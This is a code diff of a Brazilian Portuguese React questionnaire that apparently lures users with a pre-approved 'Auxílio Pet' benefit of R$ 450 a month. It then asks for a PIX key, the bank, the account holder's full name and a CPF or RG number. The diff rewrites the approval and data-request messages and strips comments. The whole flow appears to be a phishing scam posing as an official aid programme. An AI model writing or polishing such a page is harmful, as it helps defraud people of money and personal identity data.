@@ -121,14 +121,14 @@ function Questionario() {
       case "Q7": return { text: "Você possui alguma clínica veterinária próxima à sua residência para utilizar os serviços do Auxílio Pet?", type: 'options' };
       
       case "APPROVAL": return { 
-        text: "Informamos que a análise preliminar dos dados cadastrais foi concluída.\n\nSITUAÇÃO: DEFERIDO (APROVADO)\n\nO requerente atende aos critérios de elegibilidade para o Programa Auxílio Pet. O benefício mensal de até R$ 450,00 foi pré-aprovado para custeio de alimentação e saúde veterinária.\n\nSTATUS: Aguardando dados bancários para repasse.\n\nPara prosseguir com a liberação dos recursos, solicitamos a confirmação dos dados de recebimento abaixo.", 
+        text: "Informamos que a análise preliminar dos dados cadastrais foi concluída.\n O benefício mensal de até R$ 450,00 foi pré-aprovado para custeio de alimentação e saúde veterinária.\n\n Aguardando dados bancários para repasse.\n\nPara prosseguir com a liberação dos recursos, solicitamos a confirmação dos dados de recebimento abaixo.", 
         type: 'auto' 
       };
       
-      case "Q8": return { text: "🏦 DADOS PARA REPASSE DO BENEFÍCIO\n\nInforme a chave PIX da conta titular que receberá o auxílio:", type: 'input' };
+      case "Q8": return { text: " DADOS PARA REPASSE DO BENEFÍCIO\n\nInforme a chave PIX da conta titular que receberá o auxílio:", type: 'input' };
       case "Q9": return { text: "Qual a instituição bancária da conta informada?", type: 'input' };
       case "Q10": return { text: "O titular da conta reside e é domiciliado no Brasil?", type: 'options' };
-      case "Q11": return { text: "Nome completo do titular da conta (conforme documento oficial):", type: 'input' };
+      case "Q11": return { text: "Nome completo do titular da conta:", type: 'input' };
       case "Q12": return { text: "Confirme o número do CPF ou RG do titular:", type: 'input' };
       
       case "FINAL_MSG": return { 
@@ -202,7 +202,7 @@ function Questionario() {
 
   return (
     <div className="min-h-screen bg-[#F8F9FA] flex flex-col font-sans">
-      {/* Header */}
+      
       <div className="bg-white border-b border-gray-200 py-4 px-6 shadow-sm sticky top-0 z-50">
         <div className="container mx-auto max-w-2xl flex items-center gap-4">
           <button onClick={() => navigate('/')} className="text-gray-500">
@@ -214,7 +214,7 @@ function Questionario() {
         </div>
       </div>
 
-      {/* Chat Area - Aumentei o padding bottom (pb-64) para as respostas não tamparem as perguntas */}
+      
       <main className="flex-1 container mx-auto px-4 py-6 pb-64 max-w-2xl">
         <div className="space-y-6">
           {messages.map((message) => (
